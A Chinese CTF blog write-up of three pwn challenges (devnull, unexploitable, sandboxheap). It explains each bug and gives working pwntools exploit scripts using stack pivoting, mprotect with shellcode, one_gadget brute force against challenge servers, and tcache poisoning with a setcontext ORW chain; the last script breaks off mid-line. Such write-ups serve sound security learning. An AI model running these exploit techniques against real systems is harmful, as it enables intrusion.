    <content><![CDATA[<p>第一次打强网杯，加上强网先锋中的devnull这道题，一共放了18道pwn题。强pwn杯了属于是。不过自己还是太菜了18道pwn，就会做一道。主要也确实是没有学到后面的部分，目前的水平也只够做devnull这道题的，相信明年的时候会做出来更多的pwn题。然后这里我详细写一下devnull这道题的write up。</p>
<p>这道题应该是必须要一个2.34的libc，而且用glibc-all-in-one里的libc patch上去还有点问题。所以我选择了直接把文件拉到docker里做。</p>
<p>如果你想简单学习一下docker，可以看一下我写的这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">文章</a></p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035191.png"></p>
<h2 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在:"></a>漏洞所在:</h2><p>首先要先明确一点，fgets(s,n,stdin)函数只能读入n-1个字符，最后会在字符串末尾添加一个\x00。</p>
<p>我们看一下下面三张图片：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035192.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035193.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035194.png" alt="image-20221007213844664"></p>
<p>发现fgets将数据写入s的地址和fd(这个是接下来read函数的fd，等下会分析)相差0x20，而我们可以输入0x21个数据(其实只能写入0x20个字节数据，最后一个是\x00)，而最后的00就溢出到了fd上。</p>
<p>我们再看下read函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035195.png" alt="image-20221007213902123"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035196.png"></p>
<p>发现正常的话，这里的fd应该是3。(然后再看下read函数的后两个参数)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035197.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035198.png" alt="image-20221007213939023"></p>
<p>然后得出结论，如果fd是0的话，输入0x2c个数据是可以溢出到返回地址的。但正常情况下fd是3，也就是说，正常情况下我们其实没法用这个read从stdin上输入数据。所以必须让它为0，方法就是fgets输满，将fd溢出成0（上面提过了）</p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><h3 id="控制第二个read的buf"><a href="#控制第二个read的buf" class="headerlink" title="控制第二个read的buf"></a>控制第二个read的buf</h3><p>由于我们这道题没办法泄露libc地址，但是正好有个mprotect函数，所以就考虑去执行mprotect获取一片可读可写可执行的区域后，打shellcode来获取shell。尽管题目close(1) 但是我们只要可以获取shell，将输出重定向一下即可，所以问题不大。</p>
<p>然后现在就考虑怎么去执行mprotect函数打shellcode。</p>
<p>上面提到了，我们可以溢出到返回地址，但是也仅仅只能溢出到返回地址，所以考虑来打一个栈迁移。</p>
<p>但是最重要的一个问题就是我们怎么将数据输入到迁移的地方。就是迁移之后，执行啥？</p>
<p>我们再看看还有没有能利用的地方了，发现还有最后一个read可以用。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035199.png"></p>
<p>而这个read输入的数据是写到了buf的位置。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035200.png" alt="image-20221007213959805"></p>
<p>而buf又正好可以被第一次read函数的数据给覆盖掉，所以说这个read写入数据的地址其实是可控的，因此我们可以将执行流迁移到一个固定且已知的地址，然后再用第二次read向迁移的地方布置一个rop链。</p>
<h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>我感觉这道题布置rop链这里也挺关键的，不知道其他师傅和我的思路一不一样。</p>
<p>我们调试一下，看看执行迁移时寄存器的值有没有什么能利用的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035201.png" alt="image-20221007214008908"></p>
<p>此时是栈迁移时寄存器的值，我们发现rdx的值正好是7，而我们最终要想办法执行mprotect函数的值也要是7，因此rdx的值就可以直接利用，不需要再去改变了(这个rdx是strlen函数执行后给write函数残留下来的)，同时rsi的值对于mprotect函数来说是更改内存权限的大小，很明显此时的rsi作为大小的话，也是ok的。</p>
<p>因此最后我们只需要将rdi控制住即可，想办法将rdi改成0x3ff000这个地址(因为我选择迁移到这个地址上)，之所以没迁移到bss段上是因为程序执行了mprotect函数，将0x400000以及后面0x402000 0x403000这几个区域的权限都改成了r，因此数据写不进去了…所以只能选择迁移到上面的0x3ff000处。</p>
<h3 id="控制rdi寄存器"><a href="#控制rdi寄存器" class="headerlink" title="控制rdi寄存器"></a>控制rdi寄存器</h3><p>接下来就是考虑怎么控制rdi寄存器，可以说控制rdi是布置rop链的核心，如果这里搞定了，剩下的也很容易搞定，如果这里卡住的话，就没法继续下去了</p>
<p>我们先使用Ropgadget搜一下，发现没有能控制rdi或者edi的寄存器的gadget</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035202.png"></p>
<p>因此我们只能去间接控制rdi的值，我们将目光转到call mprotect之前的汇编上。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035203.png" alt="image-20221007214042643"></p>
<p>发现rdi是rax给的。我们去看看，有没有gadget能控制rax或者eax</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035204.png" alt="image-20221007214117512"></p>
<p>我们发现这个gadget似乎能控制eax，只要我们能控制rbp的话，最后发现很轻易的就可以用pop 来控制rbp(如下图)。所以我们通过rbp来控制eax，通过eax来控制mprotect函数的rdi寄存器。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035205.png"></p>
<p>因此我们在rop链上先写一个pop rbp;ret的指令，然后将[rbp-0x18]的值给eax(我们需要提前在rbp-0x18的位置布置好eax的值)，最后放上0x4012D5的地址即可正确执行mprotect函数了。</p>
<p><strong>有个伏笔要提一下，就是我们需要提前在rbp-0x18的地方布置我们的eax值(rbp的值改0x3ff000-8,因为我们要保证迁移后正好要到0x3ff000这个地址)，便于后续的rop。而这个值要产生就要在第一次read函数的时候将第二次read的buf改成0x3ff000-8。这样再输入的时候，我们就可以在0x3ff000-8的位置放成eax的值了，之后的0x3ff000就是pop rbp;ret的地址，然后再往下是rbp的值，接着就是mov eax, dword ptr [rbp - 0x18] ; leave ; ret指令的地址。而这个指令执行的时候[rbp-0x18]正好指向的就是eax的值(pop rbp的时候把rbp改成0x3ff000+0x10)这样才能保证执行mov eax, dword ptr [rbp - 0x18] ; leave ; ret指令中的leave;ret之后，再一次迁移还在rop链上。(这里的过程要是没理解的话，可以去对着脚本调试一下，应该就明白了，感觉我这么硬讲确实有点不容易理解hh)</strong></p>
<p>可以说这里的布局是一环扣一环，错一个地址都不行(可能其他师傅也有其他方法吧)</p>
<p>至此rop链的核心部分已经说明完了，最后填上0x4012D5这个地址(也就是call mprotect之前的那个mov rdi,rax),程序到这里之后，就会顺利成章的执行mprotect函数了。(效果如下图)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035206.png" alt="image-20221007214144313"></p>
<p>最后算好shellcode的地址，然后布置shellcode的地址到rop链上。最终即可获取shell。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012035207.png" alt="image-20221007214154568"></p>
<h2 id="打远程的一个坑"><a href="#打远程的一个坑" class="headerlink" title="打远程的一个坑:"></a>打远程的一个坑:</h2><p>实际做题的时候，我只打通了本地，感觉确实都没有问题，但远程始终没有通，而且这道题我也是拉到21.10的docker中跑的，跟远程的libc也是一模一样的。然后懵了很久很久，最终 winmt 师傅提醒我说三次payload要一起发送(就是本来发三次payload，但是打远程需要3次的payload合成一个payload发送一次)才能打通远程，emmm，这个结论的原因师傅们也没有给出一个明确的答案，所以关于这个问题暂且不谈。</p>
<p>不过有个问题就是一次都将数据发送给fgets函数，正常来说多余的字节都存留在了输入缓冲区，但是read函数并不存输入缓冲区中读入数据。可read函数最后也确实接收到了数据…因此我对这里感到非常疑惑。最终请教了 winmt 师傅和 roderick 师傅，终于才搞明白这里。因为setvbuf函数将输入缓冲区设置为了每次读入一个字符，正常情况下fgets函数是读入数据遇到\n为止，将这些数据全部读入到输入缓冲区中，然后再从输入缓冲区中读入n-1个字符。而setvbuf函数执行后fgets函数就变成了从缓冲区中一个字符一个字符读入后，再将字符给到指定内存地址。因此读入n-1字符后自然就停止了，而后面一起发送的数据则留在了stdin中，最后read(0,buf,length)的时候自然就从stdin中读出来了数据。</p>
<p>最后打通了，别忘了将输出重定向~</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;39.107.237.149&#x27;</span>,<span class="number">12998</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p,0x40145e,0x4014E3,0x401512)</span></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;please input your filename\n&#x27;,0x20*b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,0x40145E)</span></span><br><span class="line">leave_ret=<span class="number">0x401511</span></span><br><span class="line">addr=<span class="number">0x3ff000</span></span><br><span class="line">add_rax=<span class="number">0x401297</span></span><br><span class="line">mov_eax=<span class="number">0x401351</span></span><br><span class="line">pop_rbp_addr=<span class="number">0x000000000040129d</span></span><br><span class="line">main_addr=<span class="number">0x401513</span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">b&#x27;a&#x27;</span>+(<span class="number">0x14</span>)*<span class="string">b&#x27;c&#x27;</span>+p64(addr-<span class="number">8</span>)+p64(addr-<span class="number">8</span>)+p64(leave_ret)+p64(<span class="number">0x3ff000</span>)+p64(pop_rbp_addr)+p64(<span class="number">0x3ff000</span>-<span class="number">8</span>+<span class="number">0x18</span>)+p64(mov_eax)+p64(<span class="number">0x4012D5</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x3ff030</span>)+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input your filename\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendafter(&#x27;Please write the data you want to discard\n&#x27;,(0x14)*b&#x27;c&#x27;+p64(addr-8)+p64(addr-8)+p64(leave_ret))</span></span><br><span class="line"><span class="comment">#payload=p64(0x3ff000)+p64(pop_rbp_addr)+p64(0x3ff000-8+0x18)+p64(mov_eax)+p64(0x4012D5)+p64(0xdeadbeef)+p64(0x3ff030)+shellcode_store(&#x27;shell_64&#x27;)</span></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;please input your new data\n&#x27;,payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>2022_祥云杯_pwn 部分wp</title>
    <url>/posts/30a1c326.html</url>
    <content><![CDATA[<p>赛题WP</p>
<span id="more"></span>

<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037933.png" alt="image-20221029152901840" style="zoom:50%;" />



<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037934.png" alt="image-20221029153046424" style="zoom:50%;" />

<p>因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。</p>
<p>通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_gadget。通过用set命令更改内存的值为one_gadget，发现第一个one_gadget就能用(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037935.png" alt="image-20221029153558694" style="zoom:50%;" />

<p>于是思路就是将libc start main的后三字节，改为one_gadget地址(由于libc地址后三位是固定的，所以我们需要爆破前三位，概率为1&#x2F;4096)。</p>
<p>但如果我们单纯的填垃圾数据，然后溢出篡改的话，情况如下</p>
<img src="../img/image-20221029154216496.png" alt="image-20221029154216496" style="zoom:50%;" />

<p>即使我们溢出篡改了libc_start_main,也会返回到它上面的地址，所以我们需要让执行流滑到libc_start_main上，开了PIE保护，我们无法直接获取ret指令的地址，但是vsyscall的地址始终是固定的，它可以当做ret指令来用。</p>
<p>所以我们把上图的0xdeadbeef改成vsyscall的地址即可，执行到vsyscall的时候就可以往下滑到爆破成功的one_gadget，从而获取shell。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffff600000</span>)*<span class="number">2</span>+<span class="string">b&#x27;\xa5\x22\x06&#x27;</span></span><br><span class="line">    <span class="comment">#debug(p)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    a=p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&quot;101.201.71.136&quot;</span>,<span class="number">41614</span>)</span><br><span class="line">        <span class="comment">#p=process(&quot;./unexploitable&quot;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221029155442239.png" alt="image-20221029155442239"></p>
<p>hhhh，运气不够，终端来凑，开了12个，爆了六七分钟。</p>
<h2 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037936.png" alt="image-20221030114249283"></p>
<h3 id="沙箱分析："><a href="#沙箱分析：" class="headerlink" title="沙箱分析："></a>沙箱分析：</h3><p>因为本人比较菜，第一次见到题目给的这种沙箱文件，再加上比较好奇，就研究了一番，大致的分析过程如下：</p>
<p>通过查阅资料发现ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)的第四个参数是&amp;regs，而这个regs是在ptrace.h定义的一个结构体user_regs_struct(用来保存各个寄存器的值)，我们再去看下IDA里的伪代码(如下)，发现第四个参数是v8，因此判断v8就是user_regs_struct结构体</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037937.png" alt="image-20221031093052357" style="zoom:50%;" />



<p>所以我们去将v8的类型改成user_regs_struct(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037938.png" alt="image-20221031093545472"></p>
<p>同时还可以看到由于v8确定为结构体后，里面的一些寄存器也在IDA中显示了出来</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037939.png" alt="image-20221031093911118" style="zoom:50%;" />



<p>这时候我们从头分析一下，fork的返回值给了v3，然后又把v3给v4.接着if(v3)，而fork函数会有两个返回值，原本的父进程会返回子进程的id,而子进程则返回0。所以接下来的if(v3)只有父进程(sandbox)能进</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037940.png" alt="image-20221031094002359"></p>
<p>子进程返回的是0，所以触发else(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037941.png" alt="image-20221031094347999"></p>
<p>第一行的ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)表示被父进程跟踪，任何信号(包括子进程中执行的syscall)都会暂停子进程，阻塞与wait()等待的父进程被唤醒。第二行的execvp则执行了a2[1]这个文件，a2则是命令行参数，这道题的沙箱自然是给sandboxheap开的，所以本题正确的运行方式应该是<code>./sandbox ./sandboxheap</code> ，这样子进程就调用了题目的附件。从而实现了个sandboxheap开了一个沙箱保护。</p>
<p>接着回到父进程那边，现在去看一下这个沙箱是怎么实现对某些系统调用的拦截的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037942.png" alt="image-20221031100404042"></p>
<p>在①的位置使用了ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)，此时子进程的寄存器信息会存储到regs结构体里，而在②的上面一行，去赋给了regs.rax为-1，然后执行②的时候，ptrace(PTRACE_SETREGS, child_pid, NULL, &amp;regs) 会将regs结构体里的值拷贝给子进程的各个寄存器，这样子进程的rax就变成了-1，当子进程去执行syscall的时候发现rax是一个无效的系统调用号，就会报bad syscall从而完成了拦截。</p>
<p>而我们要绕过沙箱的禁用，所以想办法不能被拦截下来。重新看一下规则，只要我们能保证这个位置的数值是0，那就不会被拦截下来(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037943.png" alt="image-20221031101842345"></p>
<p>但是在最开始执行alarm系统调用(系统调用号为37)的时候，对0x202040这片内存进行了赋值为1的操作(如下)，也就是说正常的话，我们rax无论是多少，最终加上0x202040这个地址拿到的都是1，从而被拦截。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037944.png" alt="image-20221031102022071"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037945.png" alt="image-20221031102056360" style="zoom:50%;" />

<p>但是我们发现程序里给了一些位置为0的机会，我们将给的这些地址都去减0x202040后，看一下对应的系统调用(如下)</p>
<p>如果我们想把open和read、write都位置都置成1，那就需要下面的两个if全部进入，而a1如果为3的话，就可以满足两个if的判断</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037946.png" alt="image-20221031102922661" style="zoom:50%;" />

<p>这个a1就是rdi，而想进入这个函数，需要rax为0x2710(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037947.png" alt="image-20221031103414119" style="zoom:50%;" />

<p>综上所述，如果我们想完成orw的话，需要在此之前设置rdi为3 rax为0x2710并执行一次syscall，才能自定义一个能够orw的白名单。</p>
<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037948.png" alt="image-20221030114430759" style="zoom:50%;" />

<p>在edit函数里，input函数(函数已重命名)的参数有个+1，所以判断这里是存在个溢出的。</p>
<p>然后input函数里面是这样的(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037949.png" alt="image-20221030115609820" style="zoom:50%;" />

<p>说实话这个我没太看懂，不过根据调试和师傅们的提示，感觉这里的大概意思就是说，我们输入的一个字节只取末尾一个比特，而八个字节就会取出来八个比特，这取出来的八个比特才表示出了一个字节。在以前我们想发送p64()打包后的数据，仅仅只需要发送八字节，但是在这题里，我们需要用64个字节来表示一个八字节的地址。</p>
<p>举个例子，我们原本要往内存里写一个地址为<code>0xdeadbeef</code>，以前的话，我们使用p64(0xdeadbeef)即可，但是这道题的话，我们使用下面的部分才能达到同样的效果</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>重新回到漏洞上面，这道题通过调试可以发现是溢出了一个比特，其实跟off by null的思路一样，都是去溢出然后篡改堆块的prev_inuse位，然后去打一个堆块合并。但是这道题还有一个难点就是有沙箱保护，通过分析沙箱规则，我们需要打一条rop链。因此对应的策略就是用setcontext来改变寄存器的值，从而将执行流劫持到rop链上</p>
<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><p>由于我们需要打堆块合并，所以需要让合并的堆块释放掉能够进入unsorted bin，因此第一件事是先填满tcache bin。接着去打堆块合并,脚本如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br></pre></td></tr></table></figure>



<p>接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。</p>
<h3 id="关于setcontext"><a href="#关于setcontext" class="headerlink" title="关于setcontext"></a>关于setcontext</h3><p>由于是第一次利用这个setcontext，所以对setcontext做一点总结。</p>
<p>这个setcontext是libc库里的一个函数，汇编代码如下:</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037950.png" alt="image-20221031111347679"></p>
<p>通过汇编代码发现，该函数主要是通过取rdi加上偏移的内存来对大部分寄存器进行了赋值，如果我们能够控制rdi，并且让rdi之后的一定内存都是可控的，就相当于我们可以控制大部分寄存器的值了。假设我们将free_hook劫持为setcontext+53的地址,因为free函数时rdi本身就是堆块的地址，所以rdi之后的内存我们也是可控的，这样下次执行free的时候，就可以控制大部分的寄存器了。需要注意的是，为了保证执行流不断，所以我们要控制rcx寄存器，在上面的汇编中有一个push rcx，而接下来最后是一个ret可以将执行流控制到rcx上，换句话说，最后setcontext执行完的rip由rcx决定。利用思路就是设置大部分寄存器，然后去打一个read的系统调用，将orw的rop链读到read函数要返回的地址上，完成orw。</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:12243&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x67616c662f2e</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xc0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">context_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span 